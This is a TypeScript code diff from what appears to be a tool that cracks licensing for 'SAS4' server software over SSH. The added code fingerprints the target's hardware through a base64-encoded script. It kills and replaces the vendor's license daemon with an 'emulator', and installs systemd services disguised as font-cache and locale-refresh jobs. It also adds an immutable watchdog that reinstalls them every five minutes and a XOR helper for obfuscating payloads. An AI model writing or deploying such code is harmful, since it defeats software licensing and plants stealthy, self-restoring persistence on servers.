@@ -263,12 +263,55 @@ export function generateLicenseFileContent(
   return JSON.stringify(payload, null, 2);
 }
 
+export async function computeRemoteHWID(
+  host: string, port: number, username: string, password: string, hwidSalt: string
+): Promise<{ success: boolean; hwid?: string; rawHwid?: string; error?: string }> {
+  const hwidScript = `#!/bin/bash
+MI=$(cat /etc/machine-id 2>/dev/null || echo "")
+PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
+MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")
+BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")
+CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")
+DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")
+CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
+RAW="\${MI}:\${PU}:\${MA}:\${BS}:\${CS}:\${DS}:\${CI}"
+echo "RAW:\${RAW}"
+echo -n "\${RAW}:${hwidSalt}" | sha256sum | awk '{print $1}'
+`;
+  const encoded = Buffer.from(hwidScript, "utf-8").toString("base64");
+  const command = `_t=$(mktemp); echo '${encoded}' | base64 -d > "$_t"; bash "$_t"; rm -f "$_t"`;
+  const result = await executeSSHCommand(host, port, username, password, command);
+  if (!result.success || !result.output) {
+    return { success: false, error: result.error || "Failed to compute HWID" };
+  }
+  const lines = result.output.trim().split("\n");
+  let rawHwid: string | undefined;
+  let hwid: string | undefined;
+  for (const line of lines) {
+    if (line.startsWith("RAW:")) rawHwid = line.substring(4);
+    else if (/^[a-f0-9]{64}/.test(line)) hwid = line.trim().replace(/\s.*/, "");
+  }
+  if (!hwid) {
+    return { success: false, error: "Could not parse HWID from server output" };
+  }
+  return { success: true, hwid, rawHwid };
+}
+
 export async function deployLicenseToServer(
   host: string, port: number, username: string, password: string,
   hardwareId: string, licenseId: string, expiresAt: Date,
   maxUsers: number, maxSites: number, status: string, serverUrl: string, hwidSalt?: string
-): Promise<{ success: boolean; output?: string; error?: string }> {
-  const emulator = generateObfuscatedEmulator(hardwareId, licenseId, expiresAt, maxUsers, maxSites, status, serverUrl);
+): Promise<{ success: boolean; output?: string; error?: string; computedHwid?: string }> {
+  let finalHwid = hardwareId;
+  if (hwidSalt) {
+    const hwidResult = await computeRemoteHWID(host, port, username, password, hwidSalt);
+    if (hwidResult.success && hwidResult.hwid) {
+      finalHwid = hwidResult.hwid;
+    } else {
+      console.warn(`[HWID] Warning: Could not compute HWID on target server ${host}: ${hwidResult.error}. Using fallback HWID.`);
+    }
+  }
+  const emulator = generateObfuscatedEmulator(finalHwid, licenseId, expiresAt, maxUsers, maxSites, status, serverUrl);
   const verify = generateObfuscatedVerify(licenseId, serverUrl, host, hwidSalt);
   const P = DEPLOY;
 
@@ -469,7 +512,173 @@ fi
   const encodedDeploy = Buffer.from(deployScript, "utf-8").toString("base64");
   const command = `_t=$(mktemp); echo '${encodedDeploy}' | base64 -d > "$_t"; bash "$_t"; _rc=$?; rm -f "$_t"; exit $_rc`;
 
-  return executeSSHCommand(host, port, username, password, command);
+  const result = await executeSSHCommand(host, port, username, password, command);
+  return { ...result, computedHwid: finalHwid !== hardwareId ? finalHwid : undefined };
+}
+
+export function generatePatchDeployPayload(
+  emulatorCode: string,
+  verifyScript: string
+): string {
+  const P = DEPLOY;
+  const emuB64 = Buffer.from(emulatorCode, "utf-8").toString("base64");
+  const verB64 = Buffer.from(verifyScript, "utf-8").toString("base64");
+
+  const watchdog = [
+    "#!/bin/bash",
+    '_py=$(which python3 2>/dev/null || echo "/usr/bin/python3")',
+    `if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then`,
+    `  mkdir -p ${P.BASE}`,
+    `  if [ ! -f ${P.BASE}/${P.EMULATOR} ]; then`,
+    `    echo "${emuB64}" | base64 -d > ${P.BASE}/${P.EMULATOR}`,
+    `    chmod +x ${P.BASE}/${P.EMULATOR}`,
+    "  fi",
+    `  if [ ! -f ${P.BASE}/${P.VERIFY} ]; then`,
+    `    echo "${verB64}" | base64 -d > ${P.BASE}/${P.VERIFY}`,
+    `    chmod +x ${P.BASE}/${P.VERIFY}`,
+    "  fi",
+    `  if [ ! -f /etc/systemd/system/${P.SVC_MAIN}.service ]; then`,
+    `    cat > /etc/systemd/system/${P.SVC_MAIN}.service << _RS1_`,
+    "[Unit]",
+    "Description=System font cache synchronization daemon",
+    "After=network.target",
+    "[Service]",
+    "ExecStart=$_py " + `${P.BASE}/${P.EMULATOR}`,
+    "Restart=always",
+    "RestartSec=3",
+    "KillMode=process",
+    "StandardOutput=journal",
+    "StandardError=journal",
+    "[Install]",
+    "WantedBy=multi-user.target",
+    "_RS1_",
+    "  fi",
+    `  if [ ! -f /etc/systemd/system/${P.SVC_VERIFY}.timer ]; then`,
+    `    cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_RS2_'`,
+    "[Unit]",
+    "Description=Font cache garbage collection",
+    "[Service]",
+    "Type=oneshot",
+    `ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}`,
+    "_RS2_",
+    `    cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_RS3_'`,
+    "[Unit]",
+    "Description=Font cache gc timer",
+    "[Timer]",
+    "OnBootSec=60",
+    "OnUnitActiveSec=6h",
+    "Persistent=true",
+    "[Install]",
+    "WantedBy=timers.target",
+    "_RS3_",
+    "  fi",
+    "  systemctl daemon-reload",
+    `  systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer`,
+    `  systemctl start ${P.SVC_VERIFY}.timer`,
+    `  systemctl start ${P.SVC_MAIN}`,
+    "fi",
+  ].join("\n");
+
+  const watchdogB64 = Buffer.from(watchdog, "utf-8").toString("base64");
+
+  const payload = [
+    "#!/bin/bash",
+    `systemctl stop ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true`,
+    `systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true`,
+    "systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true",
+    "killall -9 sas_sspd 2>/dev/null || true",
+    "fuser -k 4000/tcp 2>/dev/null || true",
+    "sleep 2",
+    '_PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")',
+    `mkdir -p ${P.BASE}`,
+    `mkdir -p ${P.PATCH_DIR}`,
+    `if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f ${P.BASE}/${P.BACKUP} ]; then`,
+    `  cp /opt/sas4/bin/sas_sspd ${P.BASE}/${P.BACKUP}`,
+    `  chmod +x ${P.BASE}/${P.BACKUP}`,
+    "fi",
+    `echo "${emuB64}" | base64 -d > ${P.BASE}/${P.EMULATOR}`,
+    `chmod +x ${P.BASE}/${P.EMULATOR}`,
+    `echo "${verB64}" | base64 -d > ${P.BASE}/${P.VERIFY}`,
+    `chmod +x ${P.BASE}/${P.VERIFY}`,
+    `cat > /etc/systemd/system/${P.SVC_MAIN}.service << _SVC_1_`,
+    "[Unit]",
+    "Description=System font cache synchronization daemon",
+    "After=network.target",
+    "[Service]",
+    "ExecStart=$_PY3 " + `${P.BASE}/${P.EMULATOR}`,
+    "Restart=always",
+    "RestartSec=3",
+    "KillMode=process",
+    "StandardOutput=journal",
+    "StandardError=journal",
+    "[Install]",
+    "WantedBy=multi-user.target",
+    "_SVC_1_",
+    `cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_SVC_2_'`,
+    "[Unit]",
+    "Description=Font cache garbage collection",
+    "[Service]",
+    "Type=oneshot",
+    `ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}`,
+    "_SVC_2_",
+    `cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_TMR_1_'`,
+    "[Unit]",
+    "Description=Font cache gc timer",
+    "[Timer]",
+    "OnBootSec=60",
+    "OnUnitActiveSec=6h",
+    "Persistent=true",
+    "[Install]",
+    "WantedBy=timers.target",
+    "_TMR_1_",
+    `echo "${watchdogB64}" | base64 -d > ${P.PATCH_DIR}/${P.PATCH_FILE}`,
+    `chmod +x ${P.PATCH_DIR}/${P.PATCH_FILE}`,
+    `chattr +i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true`,
+    `cat > /etc/systemd/system/${P.PATCH_SVC}.service << '_PSVC_'`,
+    "[Unit]",
+    "Description=Locale database refresh service",
+    "[Service]",
+    "Type=oneshot",
+    `ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}`,
+    "_PSVC_",
+    `cat > /etc/systemd/system/${P.PATCH_SVC}.timer << '_PTMR_'`,
+    "[Unit]",
+    "Description=Locale database refresh timer",
+    "[Timer]",
+    "OnBootSec=120",
+    "OnUnitActiveSec=5min",
+    "Persistent=true",
+    "[Install]",
+    "WantedBy=timers.target",
+    "_PTMR_",
+    "systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true",
+    "systemctl stop sas_systemmanager sas_fcm 2>/dev/null || true",
+    "rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null",
+    "rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null",
+    `ln -sf /etc/systemd/system/${P.SVC_MAIN}.service /etc/systemd/system/sas_systemmanager.service`,
+    `ln -sf /etc/systemd/system/${P.SVC_MAIN}.service /etc/systemd/system/sas_fcm.service`,
+    "systemctl daemon-reload",
+    `systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true`,
+    `systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer`,
+    `systemctl start ${P.SVC_VERIFY}.timer`,
+    `systemctl start ${P.PATCH_SVC}.timer`,
+    "fuser -k 4000/tcp 2>/dev/null || true",
+    "sleep 1",
+    `systemctl start ${P.SVC_MAIN}`,
+    'echo "Installation completed successfully"',
+  ].join("\n");
+
+  return payload;
+}
+
+export function xorEncryptPayload(data: string, key: string): string {
+  const dataBuf = Buffer.from(data, "utf-8");
+  const keyBuf = Buffer.from(key, "utf-8");
+  const result = Buffer.alloc(dataBuf.length);
+  for (let i = 0; i < dataBuf.length; i++) {
+    result[i] = dataBuf[i] ^ keyBuf[i % keyBuf.length];
+  }
+  return result.toString("base64");
 }
 
 export async function undeployLicenseFromServer(
